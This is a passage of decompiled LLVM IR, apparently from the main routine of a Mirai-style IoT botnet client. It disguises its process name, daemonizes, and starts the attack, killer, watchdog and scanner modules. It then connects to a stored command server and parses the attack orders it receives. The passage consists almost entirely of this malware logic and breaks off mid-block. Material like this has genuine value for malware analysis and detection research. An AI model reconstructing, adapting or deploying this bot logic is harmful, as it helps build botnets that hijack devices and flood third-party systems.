  %v6_d890 = call i32 @table_init(i32 %v0_d868, i32 ptrtoint (i32* @global_var_25d48.57 to i32), i32 ptrtoint (i16** @global_var_25d54.89 to i32), i32 5888)
  store i32 ptrtoint (i32* @global_var_d6d4.83 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_230c0.85 to i32), i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_d6d4.83 to i32), i32* @global_var_230c0.85, align 4
  %v1_d8a0 = call i32 @rand_init(i32 %v6_d890)
  %v2_d8a8 = ptrtoint i32* %stack_var_-136 to i32
  store i32 %v2_d8a8, i32* @r0, align 4
  store i32 32, i32* @r1, align 4
  %v0_d8b0 = call i32 @util_zero()
  %v0_d8b4 = load i32, i32* @r6, align 4
  %v7_d8b4 = icmp eq i32 %v0_d8b4, 2
  br i1 %v7_d8b4, label %dec_label_pc_d9ec, label %dec_label_pc_d8bc

dec_label_pc_d8bc:                                ; preds = %dec_label_pc_d9ec, %entry, %dec_label_pc_d9fc
  %v0_d8bc = call i32 @rand_next()
  store i32 %v0_d8bc, i32* @r6, align 4
  %v0_d8c4 = load i32, i32* @r8, align 4
  %v1_d8c4 = inttoptr i32 %v0_d8c4 to i32*
  %v2_d8c4 = load i32, i32* %v1_d8c4, align 4
  %v1_d8c8 = inttoptr i32 %v2_d8c4 to i8*
  %v2_d8c8 = call i32 @util_strlen(i8* %v1_d8c8)
  %v0_d8d0 = load i32, i32* @r8, align 4
  %v1_d8d0 = inttoptr i32 %v0_d8d0 to i32*
  %v2_d8d0 = load i32, i32* %v1_d8d0, align 4
  %v1_d8d4 = inttoptr i32 %v2_d8d0 to i8*
  %v2_d8d4 = call i32 @util_strlen(i8* %v1_d8d4)
  %v1_d8d8 = sub i32 20, %v2_d8c8
  %v0_d8e0 = load i32, i32* @r6, align 4
  %v3_d8e4 = urem i32 %v0_d8e0, %v1_d8d8
  %v2_d8ec = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_d8ec, i32* @r5, align 4
  %v2_d8f0 = add i32 %v3_d8e4, %v2_d8d4
  store i32 %v2_d8f0, i32* @r4, align 4
  %v2_d8fc = call i32 @rand_alpha_str(i32 %v2_d8ec, i32 %v2_d8f0)
  %v2_d904 = ptrtoint i32* %stack_var_-40 to i32
  %v1_d908 = load i32, i32* @r4, align 4
  %v2_d908 = add i32 %v1_d908, %v2_d904
  store i32 %v2_d908, i32* %r3.global-to-local, align 4
  store i32 0, i32* @sb, align 4
  %v0_d914 = load i32, i32* @r8, align 4
  %v1_d914 = inttoptr i32 %v0_d914 to i32*
  %v2_d914 = load i32, i32* %v1_d914, align 4
  store i32 %v2_d914, i32* @r0, align 4
  %v3_d918 = add i32 %v2_d908, -64
  %v4_d918 = inttoptr i32 %v3_d918 to i8*
  store i8 0, i8* %v4_d918, align 1
  %v2_d91c = inttoptr i32 %v2_d914 to i8*
  %v3_d91c = call i32 @util_strcpy(i8* %v2_d91c, i32 %v2_d8ec)
  store i32 32, i32* @r1, align 4
  store i32 %v2_d8ec, i32* @r0, align 4
  %v0_d928 = call i32 @util_zero()
  %v0_d92c = call i32 @rand_next()
  store i32 %v0_d92c, i32* @r7, align 4
  %v0_d934 = load i32, i32* @r8, align 4
  %v1_d934 = inttoptr i32 %v0_d934 to i32*
  %v2_d934 = load i32, i32* %v1_d934, align 4
  %v1_d938 = inttoptr i32 %v2_d934 to i8*
  %v2_d938 = call i32 @util_strlen(i8* %v1_d938)
  store i32 %v2_d938, i32* @r6, align 4
  %v0_d940 = load i32, i32* @r8, align 4
  %v1_d940 = inttoptr i32 %v0_d940 to i32*
  %v2_d940 = load i32, i32* %v1_d940, align 4
  %v1_d944 = inttoptr i32 %v2_d940 to i8*
  %v2_d944 = call i32 @util_strlen(i8* %v1_d944)
  %v0_d948 = load i32, i32* @r6, align 4
  %v1_d948 = sub i32 20, %v0_d948
  %v0_d950 = load i32, i32* @r7, align 4
  %v3_d954 = urem i32 %v0_d950, %v1_d948
  %v2_d958 = add i32 %v3_d954, %v2_d944
  store i32 %v2_d958, i32* @r4, align 4
  %v2_d964 = call i32 @rand_alpha_str(i32 %v2_d8ec, i32 %v2_d958)
  store i32 %v2_d904, i32* %r2.global-to-local, align 4
  %v1_d970 = load i32, i32* @r4, align 4
  %v2_d970 = add i32 %v1_d970, %v2_d904
  store i32 %v2_d970, i32* %r3.global-to-local, align 4
  %v0_d974 = load i32, i32* @sb, align 4
  %v1_d974 = trunc i32 %v0_d974 to i8
  %v3_d974 = add i32 %v2_d970, -64
  %v4_d974 = inttoptr i32 %v3_d974 to i8*
  store i8 %v1_d974, i8* %v4_d974, align 1
  %v4_d980 = call i32 @prctl(i32 15, i32 %v2_d8ec, i32 %v2_d904, i32 %v2_d970)
  %v1_d988 = call i32 @table_unlock_val(i32 3)
  %v3_d994 = call i32 @table_retrieve_val(i32 3, i32* nonnull %stack_var_-48)
  %v3_d998 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_d998, i32* @r2, align 4
  %v2_d9a4 = inttoptr i32 %v3_d994 to i64*
  %v3_d9a4 = call i32 @__GI___libc_write(i32 1, i64* %v2_d9a4)
  store i32 1, i32* @r2, align 4
  %v3_d9b4 = call i32 @__GI___libc_write(i32 1, i64* bitcast (i32* @global_var_1a78c.101 to i64*))
  %v1_d9bc = call i32 @table_lock_val(i32 3)
  %v1_d9c0 = call i32 @attack_init(i32 %v1_d9bc)
  %v1_d9c4 = call i32 @killer_init(i32 %v1_d9c0)
  %v1_d9c8 = call i32 @watchdog_maintain(i32 %v1_d9c4)
  %v0_d9cc = call i32 @__libc_fork()
  %v1_d9d0 = load i32, i32* @sb, align 4
  %v7_d9d4 = icmp sgt i32 %v0_d9cc, %v1_d9d0
  br i1 %v7_d9d4, label %dec_label_pc_d9d8, label %dec_label_pc_da28

dec_label_pc_d9d8:                                ; preds = %dec_label_pc_d8bc
  ret i32 %v1_d9d0

dec_label_pc_d9ec:                                ; preds = %entry
  %v0_d9ec = load i32, i32* @r8, align 4
  %v1_d9ec = add i32 %v0_d9ec, 4
  %v2_d9ec = inttoptr i32 %v1_d9ec to i32*
  %v3_d9ec = load i32, i32* %v2_d9ec, align 4
  %v1_d9f0 = inttoptr i32 %v3_d9ec to i8*
  %v2_d9f0 = call i32 @util_strlen(i8* %v1_d9f0)
  %v8_d9f8 = icmp sgt i32 %v2_d9f0, 31
  br i1 %v8_d9f8, label %dec_label_pc_d8bc, label %dec_label_pc_d9fc

dec_label_pc_d9fc:                                ; preds = %dec_label_pc_d9ec
  %v0_da00 = load i32, i32* @r8, align 4
  %v1_da00 = add i32 %v0_da00, 4
  %v2_da00 = inttoptr i32 %v1_da00 to i32*
  %v3_da00 = load i32, i32* %v2_da00, align 4
  store i32 %v2_d8a8, i32* @r0, align 4
  %v2_da08 = bitcast i32* %stack_var_-136 to i8*
  %v3_da08 = call i32 @util_strcpy(i8* %v2_da08, i32 %v3_da00)
  %v0_da0c = load i32, i32* @r8, align 4
  %v1_da0c = add i32 %v0_da0c, 4
  %v2_da0c = inttoptr i32 %v1_da0c to i32*
  %v3_da0c = load i32, i32* %v2_da0c, align 4
  %v1_da14 = inttoptr i32 %v3_da0c to i8*
  %v2_da14 = call i32 @util_strlen(i8* %v1_da14)
  store i32 %v2_da14, i32* @r1, align 4
  store i32 %v3_da0c, i32* @r0, align 4
  %v0_da20 = call i32 @util_zero()
  br label %dec_label_pc_d8bc

dec_label_pc_da28:                                ; preds = %dec_label_pc_d8bc
  %v1_da28 = call i32 @__GI_setsid(i32 %v0_d9cc)
  %v0_da2c = load i32, i32* @sb, align 4
  %v1_da30 = call i32 @__GI___libc_close(i32 %v0_da2c)
  %v1_da38 = call i32 @__GI___libc_close(i32 1)
  %v1_da40 = call i32 @__GI___libc_close(i32 2)
  %v1_da44 = call i32 @attack_init(i32 %v1_da40)
  %v1_da48 = call i32 @killer_init(i32 %v1_da44)
  %v1_da4c = call i32 @watchdog_maintain(i32 %v1_da48)
  %v1_da50 = call i32 @scanner_init(i32 %v1_da4c)
  store i32 ptrtoint (i32* @global_var_230bc.103 to i32), i32* @sl, align 4
  store i32 ptrtoint (i8** @global_var_23238.105 to i32), i32* @fp, align 4
  %v2_da64 = ptrtoint i32* %stack_var_-264 to i32
  store i32 %v2_da64, i32* @r6, align 4
  %v2_da68 = ptrtoint i32* %stack_var_-392 to i32
  store i32 %v2_da68, i32* @r7, align 4
  %v2_db4c = ptrtoint i32* %stack_var_-72 to i32
  %v2_db94 = ptrtoint i32* %stack_var_-144 to i32
  %v2_de54 = ptrtoint i8** %stack_var_-42 to i32
  %v2_dcf0 = ptrtoint i32* %stack_var_-1416 to i32
  %v2_dde8 = ptrtoint i32* %stack_var_-52 to i32
  %v2_ddec = ptrtoint i32* %stack_var_-56 to i32
  %v1_dea4 = bitcast i32* %stack_var_-136 to i8*
  br label %dec_label_pc_da6c

dec_label_pc_da6c:                                ; preds = %dec_label_pc_de68, %dec_label_pc_de9c, %bb45, %dec_label_pc_dd08, %dec_label_pc_dc4c, %dec_label_pc_dc3c, %bb42, %dec_label_pc_df24, %dec_label_pc_df08, %dec_label_pc_def0, %dec_label_pc_de78, %dec_label_pc_de10, %dec_label_pc_dd60, %dec_label_pc_dbf0, %dec_label_pc_da28
  store i32 0, i32* %stack_var_-264, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_da78

dec_label_pc_da78:                                ; preds = %dec_label_pc_da78, %dec_label_pc_da6c
  %v1_da7c = phi i32 [ %v1_da80, %dec_label_pc_da78 ], [ 4, %dec_label_pc_da6c ]
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_da7c = load i32, i32* @r6, align 4
  %v3_da7c = add i32 %v2_da7c, %v1_da7c
  %v4_da7c = inttoptr i32 %v3_da7c to i32*
  store i32 0, i32* %v4_da7c, align 4
  %v0_da80 = load i32, i32* %r3.global-to-local, align 4
  %v1_da80 = add i32 %v0_da80, 4
  store i32 %v1_da80, i32* %r3.global-to-local, align 4
  %v7_da84 = icmp eq i32 %v1_da80, 128
  br i1 %v7_da84, label %dec_label_pc_da8c, label %dec_label_pc_da78

dec_label_pc_da8c:                                ; preds = %dec_label_pc_da78
  %v0_da8c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_da8c, i32* %stack_var_-392, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_da94

dec_label_pc_da94:                                ; preds = %dec_label_pc_da94, %dec_label_pc_da8c
  %v1_da98 = phi i32 [ %v1_da9c, %dec_label_pc_da94 ], [ 4, %dec_label_pc_da8c ]
  store i32 0, i32* @r4, align 4
  %v2_da98 = load i32, i32* @r7, align 4
  %v3_da98 = add i32 %v2_da98, %v1_da98
  %v4_da98 = inttoptr i32 %v3_da98 to i32*
  store i32 0, i32* %v4_da98, align 4
  %v0_da9c = load i32, i32* %r3.global-to-local, align 4
  %v1_da9c = add i32 %v0_da9c, 4
  store i32 %v1_da9c, i32* %r3.global-to-local, align 4
  %v7_daa0 = icmp eq i32 %v1_da9c, 128
  br i1 %v7_daa0, label %dec_label_pc_daa8, label %dec_label_pc_da94

dec_label_pc_daa8:                                ; preds = %dec_label_pc_da94
  store i32 ptrtoint (i32* @global_var_230b8.107 to i32), i32* %r3.global-to-local, align 4
  %v2_daac = load i32, i32* @global_var_230b8.107, align 4
  %v7_dab0 = icmp eq i32 %v2_daac, -1
  br i1 %v7_dab0, label %dec_label_pc_dae0, label %dec_label_pc_dab8

dec_label_pc_dab8:                                ; preds = %dec_label_pc_daa8
  %v3_dab8 = udiv i32 %v2_daac, 32
  %v3_dac0 = mul nuw nsw i32 %v3_dab8, 4
  store i32 %v2_d904, i32* %ip.global-to-local, align 4
  %v2_dac8 = add i32 %v3_dac0, %v2_d904
  store i32 %v2_dac8, i32* %r3.global-to-local, align 4
  %v1_dacc = add i32 %v2_dac8, -224
  %v2_dacc = inttoptr i32 %v1_dacc to i32*
  %v3_dacc = load i32, i32* %v2_dacc, align 4
  %v1_dad0 = urem i32 %v2_daac, 32
  %v7_dad8 = shl i32 1, %v1_dad0
  %v8_dad8 = or i32 %v3_dacc, %v7_dad8
  store i32 %v8_dad8, i32* %r2.global-to-local, align 4
  store i32 %v8_dad8, i32* %v2_dacc, align 4
  br label %dec_label_pc_dae0

dec_label_pc_dae0:                                ; preds = %dec_label_pc_daa8, %dec_label_pc_dab8
  %v2_dae0 = load i32, i32* @global_var_230bc.103, align 4
  store i32 %v2_dae0, i32* @r3, align 4
  %v7_dae4 = icmp eq i32 %v2_dae0, -1
  store i32 ptrtoint (i32* @global_var_230bc.103 to i32), i32* @r8, align 4
  br i1 %v7_dae4, label %dec_label_pc_dd6c, label %dec_label_pc_daf0

dec_label_pc_daf0:                                ; preds = %dec_label_pc_dd6c, %dec_label_pc_dae0, %bb44
  %v2_daf0 = load i8, i8* bitcast (i8** @global_var_23238.105 to i8*), align 4
  %v3_daf0 = zext i8 %v2_daf0 to i32
  store i32 %v3_daf0, i32* %r3.global-to-local, align 4
  %v2_daf4 = icmp eq i8 %v2_daf0, 0
  %v2_dc0c = load i32, i32* @global_var_230bc.103, align 4
  store i32 %v2_dc0c, i32* %ip.global-to-local, align 4
  %v3_dc14 = udiv i32 %v2_dc0c, 32
  br i1 %v2_daf4, label %dec_label_pc_dc0c, label %dec_label_pc_dafc

dec_label_pc_dafc:                                ; preds = %dec_label_pc_daf0
  %v3_db0c = mul nuw nsw i32 %v3_dc14, 4
  %v2_db10 = add i32 %v3_db0c, %v2_d904
  store i32 %v2_db10, i32* %r3.global-to-local, align 4
  %v1_db14 = add i32 %v2_db10, -352
  %v2_db14 = inttoptr i32 %v1_db14 to i32*
  %v3_db14 = load i32, i32* %v2_db14, align 4
  %v1_db18 = urem i32 %v2_dc0c, 32
  %v7_db20 = shl i32 1, %v1_db18
  %v8_db20 = or i32 %v3_db14, %v7_db20
  store i32 %v8_db20, i32* %r2.global-to-local, align 4
  store i32 %v8_db20, i32* %v2_db14, align 4
  br label %dec_label_pc_db28

dec_label_pc_db28:                                ; preds = %dec_label_pc_dc0c, %dec_label_pc_dafc
  store i32 ptrtoint (i32* @global_var_230b8.107 to i32), i32* %r3.global-to-local, align 4
  %v2_db2c = load i32, i32* @global_var_230b8.107, align 4
  %v0_db30 = load i32, i32* %ip.global-to-local, align 4
  %v5_db34 = icmp slt i32 %v0_db30, %v2_db2c
  br i1 %v5_db34, label %bb42, label %bb

bb:                                               ; preds = %dec_label_pc_db28
  br label %bb42

bb42:                                             ; preds = %dec_label_pc_db28, %bb
  %v0_db50 = phi i32 [ %v2_db2c, %dec_label_pc_db28 ], [ %v0_db30, %bb ]
  store i32 0, i32* @lr, align 4
  store i32 10, i32* %stack_var_-72, align 4
  store i32 %v2_db4c, i32* %ip.global-to-local, align 4
  %v1_db50 = add i32 %v0_db50, 1
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_da68, i32* %r2.global-to-local, align 4
  %v5_db68 = call i32 @__libc_select(i32 %v1_db50, i32 %v2_da64, i32 %v2_da68, i32 0, i32 %v2_db4c)
  %v8_db6c = icmp eq i32 %v5_db68, -1
  br i1 %v8_db6c, label %dec_label_pc_da6c, label %dec_label_pc_db74

dec_label_pc_db74:                                ; preds = %bb42
  %v6_db68 = trunc i32 %v5_db68 to i16
  %v3_db74 = icmp eq i16 %v6_db68, 0
  br i1 %v3_db74, label %dec_label_pc_db7c, label %dec_label_pc_dba8

dec_label_pc_db7c:                                ; preds = %dec_label_pc_db74
  %v2_db80 = load i32, i32* @sb, align 4
  %v5_db84 = srem i32 %v2_db80, 6
  %v4_db8c = sub i32 %v2_db80, %v5_db84
  store i32 %v4_db8c, i32* %r3.global-to-local, align 4
  store i32 %v5_db84, i32* %r2.global-to-local, align 4
  %v2_db98 = icmp eq i32 %v5_db84, 0
  %v7_db9c = inttoptr i32 %v5_db68 to i8*
  store i8* %v7_db9c, i8** %stack_var_-42, align 4
  %v1_dba0 = add i32 %v2_db80, 1
  store i32 %v1_dba0, i32* @sb, align 4
  br i1 %v2_db98, label %dec_label_pc_de4c, label %dec_label_pc_dba8

dec_label_pc_dba8:                                ; preds = %dec_label_pc_db74, %dec_label_pc_db7c, %dec_label_pc_de4c
  %v2_dba8 = load i8, i8* bitcast (i8** @global_var_23238.105 to i8*), align 4
  %v3_dba8 = zext i8 %v2_dba8 to i32
  store i32 %v3_dba8, i32* @r4, align 4
  %v2_dbac = icmp eq i8 %v2_dba8, 0
  %v2_dc3c = load i32, i32* @global_var_230bc.103, align 4
  br i1 %v2_dbac, label %dec_label_pc_dc3c, label %dec_label_pc_dbb4

dec_label_pc_dbb4:                                ; preds = %dec_label_pc_dba8
  %v3_dbbc = udiv i32 %v2_dc3c, 32
  store i32 %v2_d904, i32* %r2.global-to-local, align 4
  %v3_dbc4 = mul nuw nsw i32 %v3_dbbc, 4
  %v2_dbc8 = add i32 %v3_dbc4, %v2_d904
  store i32 %v2_dbc8, i32* %r3.global-to-local, align 4
  %v1_dbcc = add i32 %v2_dbc8, -352
  %v2_dbcc = inttoptr i32 %v1_dbcc to i32*
  %v3_dbcc = load i32, i32* %v2_dbcc, align 4
  %v1_dbd0 = urem i32 %v2_dc3c, 32
  %v6_dbd4 = ashr i32 %v3_dbcc, %v1_dbd0
  store i32 %v6_dbd4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_23238.105 to i32), i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_dbe0 = urem i32 %v6_dbd4, 2
  %v2_dbe0 = icmp eq i32 %v1_dbe0, 0
  store i8 0, i8* bitcast (i8** @global_var_23238.105 to i8*), align 4
  store i32 ptrtoint (i32* @global_var_230bc.103 to i32), i32* @r4, align 4
  br i1 %v2_dbe0, label %dec_label_pc_dbf0, label %dec_label_pc_ddd8

dec_label_pc_dbf0:                                ; preds = %dec_label_pc_dbb4
  store i32 56312, i32* @lr, align 4
  %v1_dbf4 = icmp ne i32 %v2_dc3c, -1
  call void @__pseudo_cond_branch(i1 %v1_dbf4, i32 ptrtoint (i32* @global_var_15760.109 to i32))
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_dbfc = load i32, i32* @r4, align 4
  %v2_dbfc = inttoptr i32 %v1_dbfc to i32*
  store i32 -1, i32* %v2_dbfc, align 4
  %v1_dc04 = call i32 @sleep(i32 1)
  br label %dec_label_pc_da6c

dec_label_pc_dc0c:                                ; preds = %dec_label_pc_daf0
  store i32 %v2_d904, i32* %r2.global-to-local, align 4
  %v3_dc1c = mul nuw nsw i32 %v3_dc14, 4
  %v2_dc20 = add i32 %v3_dc1c, %v2_d904
  store i32 %v2_dc20, i32* %r3.global-to-local, align 4
  %v1_dc24 = add i32 %v2_dc20, -224
  %v2_dc24 = inttoptr i32 %v1_dc24 to i32*
  %v3_dc24 = load i32, i32* %v2_dc24, align 4
  %v1_dc28 = urem i32 %v2_dc0c, 32
  %v7_dc30 = shl i32 1, %v1_dc28
  %v8_dc30 = or i32 %v3_dc24, %v7_dc30
  store i32 %v8_dc30, i32* %r2.global-to-local, align 4
  store i32 %v8_dc30, i32* %v2_dc24, align 4
  br label %dec_label_pc_db28

dec_label_pc_dc3c:                                ; preds = %dec_label_pc_dba8
  %v7_dc40 = icmp eq i32 %v2_dc3c, -1
  store i32 ptrtoint (i32* @global_var_230bc.103 to i32), i32* @r8, align 4
  br i1 %v7_dc40, label %dec_label_pc_da6c, label %dec_label_pc_dc4c

dec_label_pc_dc4c:                                ; preds = %dec_label_pc_dc3c
  %v3_dc4c = udiv i32 %v2_dc3c, 32
  store i32 %v2_d904, i32* %r2.global-to-local, align 4
  %v3_dc58 = mul nuw nsw i32 %v3_dc4c, 4
  %v2_dc5c = add i32 %v3_dc58, %v2_d904
  store i32 %v2_dc5c, i32* %r3.global-to-local, align 4
  %v1_dc60 = add i32 %v2_dc5c, -224
  %v2_dc60 = inttoptr i32 %v1_dc60 to i32*
  %v3_dc60 = load i32, i32* %v2_dc60, align 4
  %v1_dc64 = urem i32 %v2_dc3c, 32
  %v6_dc68 = ashr i32 %v3_dc60, %v1_dc64
  store i32 %v6_dc68, i32* %r2.global-to-local, align 4
  %v1_dc6c = urem i32 %v6_dc68, 2
  %v2_dc6c = icmp eq i32 %v1_dc6c, 0
  br i1 %v2_dc6c, label %dec_label_pc_da6c, label %dec_label_pc_dc74

dec_label_pc_dc74:                                ; preds = %dec_label_pc_dc4c
  store i32 %v2_db94, i32* %r3.global-to-local, align 4
  %v6_dc78 = inttoptr i32 %v3_dba8 to i8*
  store i8* %v6_dc78, i8** %stack_var_-42, align 4
  %v0_dc7c = call i32 @__GI___errno_location()
  %v0_dc80 = load i32, i32* @r4, align 4
  %v2_dc80 = inttoptr i32 %v0_dc7c to i32*
  store i32 %v0_dc80, i32* %v2_dc80, align 4
  store i32 %v0_dc7c, i32* @r5, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v2_dc94 = load i32, i32* @global_var_230bc.103, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_dca0 = call i32 @__libc_recv(i32 %v2_dc94, i32 %v2_de54, i32 2, i32 16386)
  %v7_dca4 = icmp eq i32 %v4_dca0, -1
  br i1 %v7_dca4, label %dec_label_pc_de68, label %dec_label_pc_dcac

dec_label_pc_dcac:                                ; preds = %dec_label_pc_dc74
  %v2_dcac = icmp eq i32 %v4_dca0, 0
  br i1 %v2_dcac, label %dec_label_pc_de78, label %dec_label_pc_dcb4

dec_label_pc_dcb4:                                ; preds = %dec_label_pc_dcac
  store i32 %v2_db94, i32* %ip.global-to-local, align 4
  %v3_dcb8 = load i8*, i8** %stack_var_-42, align 4
  %v4_dcb8 = ptrtoint i8* %v3_dcb8 to i32
  store i32 %v4_dcb8, i32* %r3.global-to-local, align 4
  %v2_dcbc = icmp eq i8* %v3_dcb8, null
  br i1 %v2_dcbc, label %dec_label_pc_df08, label %dec_label_pc_dcc4

dec_label_pc_dcc4:                                ; preds = %dec_label_pc_dcb4
  %v3_dcc4 = udiv i32 %v4_dcb8, 256
  %v1_dcc8 = urem i32 %v4_dcb8, 256
  store i32 %v1_dcc8, i32* %r3.global-to-local, align 4
  %v4_dccc = mul nuw nsw i32 %v1_dcc8, 256
  %v5_dccc = or i32 %v4_dccc, %v3_dcc4
  %v6_dccc = trunc i32 %v5_dccc to i16
  store i32 %v5_dccc, i32* %r2.global-to-local, align 4
  store i32 %v2_db94, i32* @lr, align 4
  %v7_dcd8 = inttoptr i32 %v5_dccc to i8*
  store i8* %v7_dcd8, i8** %stack_var_-42, align 4
  %tmp46 = icmp ugt i16 %v6_dccc, 1024
  br i1 %tmp46, label %dec_label_pc_df24, label %dec_label_pc_dce0

dec_label_pc_dce0:                                ; preds = %dec_label_pc_dcc4
  %v0_dce0 = load i32, i32* @r4, align 4
  %v1_dce0 = load i32, i32* @r5, align 4
  %v2_dce0 = inttoptr i32 %v1_dce0 to i32*
  store i32 %v0_dce0, i32* %v2_dce0, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v2_dcec = load i32, i32* @global_var_230bc.103, align 4
  %v7_dcf4 = call i32 @__libc_recv(i32 %v2_dcec, i32 %v2_dcf0, i32 %v5_dccc, i32 16386)
  %v7_dcf8 = icmp eq i32 %v7_dcf4, -1
  br i1 %v7_dcf8, label %dec_label_pc_de68, label %dec_label_pc_dd00

dec_label_pc_dd00:                                ; preds = %dec_label_pc_dce0
  %v2_dd00 = icmp eq i32 %v7_dcf4, 0
  br i1 %v2_dd00, label %dec_label_pc_de78, label %dec_label_pc_dd08

dec_label_pc_dd08:                                ; preds = %dec_label_pc_dd00
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v2_dd18 = load i32, i32* @global_var_230bc.103, align 4
  %v4_dd1c = call i32 @__libc_recv(i32 %v2_dd18, i32 %v2_de54, i32 2, i32 16384)
  %v3_dd24 = load i8*, i8** %stack_var_-42, align 4
  %v4_dd24 = ptrtoint i8* %v3_dd24 to i32
  %v3_dd28 = udiv i32 %v4_dd24, 256
  %v1_dd2c = mul i32 %v4_dd24, 256
  %v4_dd30 = and i32 %v1_dd2c, 65280
  %v5_dd30 = or i32 %v4_dd30, %v3_dd28
  store i32 %v5_dd30, i32* %ip.global-to-local, align 4
  store i32 %v2_db94, i32* @lr, align 4
  store i32 %v5_dd30, i32* %r2.global-to-local, align 4
  %v2_dd40 = load i32, i32* @global_var_230bc.103, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_dd48 = inttoptr i32 %v5_dd30 to i8*
  store i8* %v6_dd48, i8** %stack_var_-42, align 4
  %v6_dd4c = call i32 @__libc_recv(i32 %v2_dd40, i32 %v2_dcf0, i32 %v5_dd30, i32 16384)
  store i32 %v2_db94, i32* %r2.global-to-local, align 4
  %v3_dd54 = load i8*, i8** %stack_var_-42, align 4
  %v3_dd58 = icmp eq i8* %v3_dd54, null
  br i1 %v3_dd58, label %dec_label_pc_da6c, label %dec_label_pc_dd60

dec_label_pc_dd60:                                ; preds = %dec_label_pc_dd08
  %v4_dd54 = ptrtoint i8* %v3_dd54 to i32
  %v5_dd64 = call i32 @attack_parse(i32* nonnull %stack_var_-1416, i32 %v4_dd54, i32 %v2_db94)
  br label %dec_label_pc_da6c

dec_label_pc_dd6c:                                ; preds = %dec_label_pc_dae0
  %v0_dd74 = load i32, i32* @r4, align 4
  store i32 %v0_dd74, i32* %r2.global-to-local, align 4
  %v3_dd78 = call i32 @socket(i32 2, i32 1, i32 %v0_dd74)
  %v7_dd7c = icmp eq i32 %v3_dd78, -1
  store i32 %v3_dd78, i32* @r5, align 4
  %v1_dd84 = load i32, i32* @r8, align 4
  %v2_dd84 = inttoptr i32 %v1_dd84 to i32*
  store i32 %v3_dd78, i32* %v2_dd84, align 4
  br i1 %v7_dd7c, label %dec_label_pc_daf0, label %dec_label_pc_dd8c

dec_label_pc_dd8c:                                ; preds = %dec_label_pc_dd6c
  %v0_dd8c = load i32, i32* @r4, align 4
  store i32 %v0_dd8c, i32* @r2, align 4
  %v2_dd94 = call i32 @__libc_fcntl(i32 %v3_dd78, i32 3)
  %v1_dd9c = or i32 %v2_dd94, 2048
  store i32 %v1_dd9c, i32* @r2, align 4
  %v0_dda0 = load i32, i32* @r5, align 4
  %v2_dda4 = call i32 @__libc_fcntl(i32 %v0_dda0, i32 4)
  %v2_ddac = load i32, i32* @global_var_230c0.85, align 4
  store i32 %v2_ddac, i32* %r3.global-to-local, align 4
  %v2_ddb0 = icmp eq i32 %v2_ddac, 0
  br i1 %v2_ddb0, label %bb44, label %bb43

bb43:                                             ; preds = %dec_label_pc_dd8c
  br label %bb44

bb44:                                             ; preds = %dec_label_pc_dd8c, %bb43
  %v2_ddb8 = xor i1 %v2_ddb0, true
  call void @__pseudo_cond_branch(i1 %v2_ddb8, i32 ptrtoint (i32* @global_var_11bd8.110 to i32))
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_ddc0 = load i32, i32* @global_var_230bc.103, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v2_ddcc = load i32, i32* @fp, align 4
  %v3_ddcc = inttoptr i32 %v2_ddcc to i8*
  store i8 1, i8* %v3_ddcc, align 1
  %v4_ddd0 = call i32 @__libc_connect(i32 %v2_ddc0, i32 ptrtoint (i16** @global_var_25d54.89 to i32), i32 16)
  br label %dec_label_pc_daf0

dec_label_pc_ddd8:                                ; preds = %dec_label_pc_dbb4
  store i32 4, i32* @r5, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 %v2_dde8, i32* %r3.global-to-local, align 4
  store i32 %v2_ddec, i32* %ip.global-to-local, align 4
  store i32 1, i32* @r1, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 4, i32* %stack_var_-56, align 4
  %v5_de00 = call i32 @getsockopt(i32 %v2_dc3c, i32 1, i32 4, i32 %v2_dde8, i32 %v2_ddec)
  %v3_de04 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_de04, i32* %r3.global-to-local, align 4
  %v2_de08 = icmp eq i32 %v3_de04, 0
  br i1 %v2_de08, label %dec_label_pc_de9c, label %dec_label_pc_de10

dec_label_pc_de10:                                ; preds = %dec_label_pc_ddd8
  %v2_de10 = load i32, i32* @global_var_230bc.103, align 4
  %v1_de14 = call i32 @__GI___libc_close(i32 %v2_de10)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_de1c = load i32, i32* @r4, align 4
  %v2_de1c = inttoptr i32 %v1_de1c to i32*
  store i32 -1, i32* %v2_de1c, align 4
  %v0_de20 = call i32 @rand_next()
  %v3_de28 = zext i32 %v0_de20 to i64
  %v4_de28 = mul nuw i64 %v3_de28, 3435973837
  %v7_de28 = trunc i64 %v4_de28 to i32
  store i32 %v7_de28, i32* @lr, align 4
  %v3_de2c2 = udiv i64 %v4_de28, 34359738368
  %v3_de304 = mul nuw nsw i64 %v3_de2c2, 8
  %v3_de30 = trunc i64 %v3_de304 to i32
  store i32 %v3_de30, i32* %r2.global-to-local, align 4
  %v2_de346 = mul nuw nsw i64 %v3_de2c2, 2
  %v2_de34 = trunc i64 %v2_de346 to i32
  %v2_de38 = add i32 %v3_de30, %v2_de34
  store i32 %v2_de38, i32* %r3.global-to-local, align 4
  %v2_de3c = sub i32 %v0_de20, %v2_de38
  %v1_de40 = add i32 %v2_de3c, 1
  %v1_de44 = call i32 @sleep(i32 %v1_de40)
  br label %dec_label_pc_da6c

dec_label_pc_de4c:                                ; preds = %dec_label_pc_db7c
  %v2_de50 = load i32, i32* @global_var_230bc.103, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
